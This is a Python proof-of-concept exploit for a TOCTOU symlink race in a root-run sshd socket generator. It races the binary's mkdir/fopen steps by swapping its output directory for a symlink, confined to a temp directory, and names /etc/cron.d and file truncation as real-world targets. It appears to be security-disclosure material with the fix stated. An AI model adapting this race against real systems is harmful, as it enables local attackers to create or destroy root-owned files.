#!/usr/bin/env python3
"""
PoC #4 — TOCTOU / Symlink Attack on sshd-socket-generator
==========================================================
Finding : MEDIUM  (README-sshd-security-flaws.md #4)
File    : sshd-socket-generator.c:192-203
Branch  : master (unfixed)

Vulnerability
-------------
The generator creates a directory and then opens a file inside it in two
separate, non-atomic steps:

    mkdir(overridedir, 0755);          // step 1 — creates the directory
    ...
    f = fopen(conf, "we");             // step 2 — follows symlinks

Between step 1 and step 2 an attacker can:

  (a) Replace overridedir with a symlink to an arbitrary directory, or
  (b) Place a symlink at <overridedir>/addresses.conf pointing to any file.

fopen() with mode "we" adds O_CLOEXEC but NOT O_NOFOLLOW, so it follows
symlinks unconditionally.  Because the generator runs as root, a successful
race allows it to CREATE or TRUNCATE an arbitrary file owned by root.

Even though the file is subsequently removed in the cleanup path
(remove(conf)), the creation/truncation itself is the primitive — it can:
  - Trigger filesystem watchers (inotify) that act on file creation
  - Truncate a sensitive file to zero bytes (destroying its content)
  - Create a new file in a privileged directory (e.g. /etc/cron.d)

Race window
-----------
The window is the time between mkdir() returning and fopen() being called —
roughly the time to execute ~10 lines of C including a calloc, a strnlen,
and a memcpy.  On a loaded system the window widens; on a fast system
repeated attempts close it reliably.

This PoC races using a polling loop in a second thread and does not require
root — it demonstrates the attack in /tmp without touching system files.
"""

import os
import sys
import shutil
import subprocess
import tempfile
import threading
import time
import stat

BINARY = os.path.realpath(
    os.path.join(os.path.dirname(__file__), '..', 'sshd-socket-generator')
)

# How many times to attempt the race
MAX_ATTEMPTS = 50

def attacker_thread(overridedir, symlink_target, result_holder, stop_event):
    """
    Spin watching for overridedir to be created by the generator, then
    immediately replace it with a symlink to symlink_target.
    """
    while not stop_event.is_set():
        if os.path.isdir(overridedir) and not os.path.islink(overridedir):
            try:
                shutil.rmtree(overridedir)
                os.symlink(symlink_target, overridedir)
                result_holder['swapped'] = True
                return
            except (OSError, FileNotFoundError):
                pass   # lost the race, try again on next attempt
        time.sleep(0)  # yield CPU

def main():
    print("=" * 60)
    print("PoC #4 — TOCTOU / symlink attack on sshd-socket-generator")
    print("=" * 60)
    print()

    if not os.path.isfile(BINARY):
        print(f"[!] Binary not found: {BINARY}")
        print("    Run 'make' in the project root first.")
        sys.exit(1)

    print(f"[*] Binary : {BINARY}")
    print(f"[*] Attempting race up to {MAX_ATTEMPTS} times ...")
    print()

    with tempfile.TemporaryDirectory(prefix='poc4_work_') as workdir:
        # The "legitimate" destination directory for the generator
        destdir      = os.path.join(workdir, 'systemd_output')
        overridedir  = os.path.join(destdir, 'ssh.socket.d')

        # The attacker's target: we want the generator to write here instead
        symlink_target = os.path.join(workdir, 'attacker_target')
        os.makedirs(symlink_target, exist_ok=True)

        # Sentinel file in the target that would be overwritten if the attack
        # succeeds.  We track whether addresses.conf appears there.
        sentinel = os.path.join(symlink_target, 'addresses.conf')

        race_won    = False
        file_landed = False

        for attempt in range(1, MAX_ATTEMPTS + 1):
            # Clean up from previous attempt
            if os.path.exists(destdir):
                # Remove symlink or real directory
                if os.path.islink(overridedir):
                    os.unlink(overridedir)
                    # Re-create as a real dir so the generator can start fresh
                    try:
                        os.rmdir(destdir)
                    except OSError:
                        pass
                else:
                    shutil.rmtree(destdir, ignore_errors=True)
            if os.path.exists(sentinel):
                os.unlink(sentinel)

            os.makedirs(destdir, exist_ok=True)

            result_holder = {'swapped': False}
            stop_event    = threading.Event()

            t = threading.Thread(
                target=attacker_thread,
                args=(overridedir, symlink_target, result_holder, stop_event),
                daemon=True,
            )
            t.start()

            proc = subprocess.run(
                [BINARY, destdir],
                capture_output=True, text=True,
            )

            stop_event.set()
            t.join(timeout=1.0)

            swapped = result_holder['swapped']

            if swapped:
                race_won = True
                # Check if the generator wrote into symlink_target
                if os.path.exists(sentinel):
                    file_landed = True
                    print(f"[+] Race WON on attempt {attempt} — "
                          f"addresses.conf CREATED at symlink target!")
                    print(f"    Symlink target : {symlink_target}")
                    print(f"    File created   : {sentinel}")
                    with open(sentinel) as f:
                        content = f.read()
                    if content:
                        print(f"    File content   :\n{content}")
                    else:
                        print("    (file is empty or was already cleaned up)")
                    break
                else:
                    print(f"[~] Attempt {attempt}: symlink swapped but file "
                          f"not observed (generator may have cleaned up first)")
            else:
                if attempt % 10 == 0:
                    print(f"[*] Attempt {attempt}: race not yet won ...")

        if not race_won:
            print(f"[-] Race not won in {MAX_ATTEMPTS} attempts.")
            print("    The window may be too narrow on this system, or the")
            print("    binary may already be patched.")
        elif not file_landed:
            print(f"[+] Race won (symlink swapped) but file not observed —")
            print("    generator likely cleaned up the file before we checked.")
            print("    In a real attack (as root) a more sensitive target path")
            print("    (e.g. /etc/cron.d) could be used where cleanup fails.")

    print()
    print("[*] Impact summary:")
    print("    A local attacker races sshd-socket-generator (running as root)")
    print("    to substitute the output directory with a symlink, causing")
    print("    fopen() to create or truncate an arbitrary root-owned file.")
    print()
    print("[*] Fix: use open(O_DIRECTORY|O_NOFOLLOW) + openat(O_NOFOLLOW)")
    print("    to eliminate the TOCTOU window entirely.")
    print("    (applied on branch security-flaw-fixes)")

if __name__ == '__main__':
    main()
